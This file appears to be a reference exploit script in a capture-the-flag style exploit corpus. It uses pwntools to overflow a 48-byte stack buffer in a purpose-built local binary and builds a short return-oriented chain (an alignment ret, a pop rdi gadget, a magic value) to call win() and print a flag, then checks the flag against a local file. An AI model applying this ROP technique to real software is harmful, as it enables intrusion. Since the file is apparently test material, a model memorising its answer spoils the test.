#!/usr/bin/env python3
"""Hand-verified reference exploit for corpus_r2/15_ret2win_arg_gate.

Technique: plain stack buffer overflow (`buf[48]`, `read(0, buf, 200)`,
no canary) redirecting into `win(long magic)`, which only prints the flag
if `magic == WIN_MAGIC` (0x1337) -- so a bare return-address overwrite
isn't enough; the chain needs a `pop rdi; ret` gadget (deliberately
embedded in the source as `pop_rdi_gadget`, independent of whatever
incidental gadgets this toolchain happens to emit) to load the argument
register before calling win().

Offset: `buf` sits at rbp-0x30 (48 bytes, matching the declared size
exactly) with `sub $0x30,%rsp` in vuln()'s prologue, so saved-rbp is 8
bytes above buf's end and the return address is 8 bytes above that:
48 + 8 = 56 bytes to the return address.

ABI stack-alignment fixup: a `ret`-based return-address hijack lands the
first gadget 8 bytes off the SysV-mandated 16-byte alignment (a `ret`
doesn't perform the extra push a real `call` would). Harmless for the
`pop rdi; ret` gadget itself, but win() calls fopen()/fgets() internally
via print_flag(), and fopen()'s internal malloc() path uses SIMD-aligned
stack accesses that fault if entered misaligned. The fix: insert one more
bare-`ret` gadget (reusing pop_rdi_gadget's own trailing `ret` instruction)
as the very first entry in the chain, consuming one extra 8-byte stack
slot to restore correct parity by the time win() is reached -- same root
cause and same fix pattern as targets 04, 08, and 10 in this corpus.

Necessity: overwriting the return address directly with win() (skipping
pop_rdi_gadget, leaving rdi as whatever garbage it holds) hits the "wrong
magic" branch, not the flag -- see ablation.py's "no magic gate" case.
"""
import os
import sys

from pwn import ELF, context, p64, process

HERE = os.path.dirname(os.path.abspath(__file__))
BIN = os.path.join(HERE, "..", "corpus_r2", "15_ret2win_arg_gate",
                    "ret2win_arg_gate")

context.log_level = "error"
context.arch = "amd64"

OFFSET_TO_RETADDR = 56
WIN_MAGIC = 0x1337


def main():
    elf = ELF(BIN, checksec=False)
    win_addr = elf.symbols["win"]
    pop_rdi = elf.symbols["pop_rdi_gadget"]
    ret_fixer = pop_rdi + 5  # the gadget's own trailing "ret" byte (bare-ret alignment fixup)

    io = process(BIN, cwd=os.path.dirname(BIN))
    io.recvuntil(b"data> ")

    payload = (
        b"A" * OFFSET_TO_RETADDR
        + p64(ret_fixer)
        + p64(pop_rdi)
        + p64(WIN_MAGIC)
        + p64(win_addr)
    )
    io.send(payload)

    out = io.recvall(timeout=3).decode(errors="replace")
    io.close()

    flag_file = os.path.join(HERE, "..", "corpus_r2", "15_ret2win_arg_gate", "flag.txt")
    with open(flag_file) as f:
        expected = f.read().strip()

    if expected in out:
        print(f"[+] PASS: flag recovered: {expected}")
        return 0
    print("[-] FAIL: flag not found in output")
    print(out)
    return 1


if __name__ == "__main__":
    sys.exit(main())
